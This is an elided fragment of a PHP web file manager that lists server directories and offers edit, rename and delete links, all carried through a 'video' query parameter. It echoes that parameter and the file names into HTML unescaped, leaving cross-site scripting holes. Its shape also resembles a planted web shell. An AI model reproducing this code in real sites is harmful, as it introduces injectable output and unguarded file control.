...
if ($currentDir !== '.') {
    ...
    echo "<a href='?video=" . $_GET['video'] . "&dir=" . urlencode($parentDir) . "'>📁 Back to Parent Directory</a><br><br>";
}
...
foreach ($files as $file) {
    ...
    if (is_dir($fullPath)) {
        ...
        echo "<a href='?video=" . $_GET['video'] . "&dir=" . urlencode($newDir) . "'><strong>$file</strong></a>";
    } else {
        echo $file;
    }
    echo "</td>";
    ...
    echo "<td>";
    if (is_file($fullPath)) {
        echo "<a href='?video=" . $_GET['video'] . "&dir=" . urlencode($currentDir) . "&file=$file'>Edit</a> | ";
    }
    echo "<form style='display:inline' method='post' action='?video=" . $_GET['video'] . "&dir=" . urlencode($currentDir) . "&rename=$file'>
        <input name='newname' value='$file' size='15'>
        <button type='submit'>Rename</button>
    </form> | ";
    echo "<a href='?video=" . $_GET['video'] . "&dir=" . urlencode($currentDir) . "&delete=$file' onclick='return confirm(\"Delete $file?\")'>Delete</a>";
    echo "</td></tr>";
}
echo "</table>";
?>
